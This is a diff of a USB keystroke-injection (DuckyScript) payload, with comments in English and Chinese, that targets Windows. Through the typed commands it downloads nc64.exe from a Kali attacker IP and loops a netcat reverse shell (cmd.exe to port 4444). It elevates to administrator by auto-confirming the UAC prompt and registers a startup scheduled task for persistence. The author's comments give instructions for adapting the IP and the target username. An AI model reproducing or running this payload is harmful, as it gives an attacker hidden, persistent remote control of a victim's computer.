@@ -25,7 +25,7 @@ DELAY 1000
 
 REM use echo to use kali-wget(my ip)
 
-REM STRING echo (wget 'http://10.122.232.108/nc64.exe' -OutFile a.exe) > b.ps1
+REM STRING echo (wget 'http://10.122.235.199/nc64.exe' -OutFile a.exe) > b.ps1
 REM yeah the ip need to change by the computer(use ifconfig in kali)
 REM so yeah the previous is above
 
@@ -35,7 +35,7 @@ REM the grammer have some problem
 
 REM 一定要注意改成kali现有的ip！（我多次忘了）
 
-STRING echo (wget 'http://10.122.206.176/nc64.exe' -OutFile a.exe) > b.ps1
+STRING echo (wget 'http://10.122.235.199/nc64.exe' -OutFile a.exe) > b.ps1
 ENTER
 
 REM 一定要注意改成kali现有的ip！（我多次忘了）
@@ -44,7 +44,7 @@ STRING powershell -ExecutionPolicy ByPass -File b.ps1
 ENTER
 DELAY 1000
 
-STRING echo while($true){./a.exe 10.122.206.176 4444 -e cmd.exe -d} > c.ps1
+STRING echo while($true){./a.exe 10.122.235.199 4444 -e cmd.exe -d} > c.ps1
 ENTER
 DELAY 1000
 
@@ -64,6 +64,7 @@ ENTER
 DELAY 500
 
 REM 输入命令创建wrapper.ps1并写入内容
+REM ！注意 这有两处需要改成目标用户名
 STRING $wrapperScriptPath = "C:\Users\halfa\wrapper.ps1"
 ENTER
 STRING $scriptContent = @"
@@ -78,6 +79,15 @@ STRING "@ | Out-File -FilePath $wrapperScriptPath -Encoding UTF8
 ENTER
 DELAY 500
 
+
+STRING Start-Process powershell -Verb runAs
+ENTER
+REM 下面这里必须delay 不然反应不过来报错
+DELAY 1000
+ALT y
+DELAY 1000
+
+REM 这里需要管理员权限（准确来说是最后一个）所以在上面写了给代码
 REM 输入命令创建计划任务
 STRING $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$wrapperScriptPath`""
 ENTER
@@ -89,9 +99,9 @@ STRING Register-ScheduledTask -TaskName "RunScriptAtStartupWithWrapper" -Action 
 ENTER
 DELAY 500
 
-REM 退出 PowerShell
-STRING exit
-ENTER
+REM 退出 PowerShell——不退了，方便我排查问题
+REM STRING exit
+REM ENTER
 
 
 
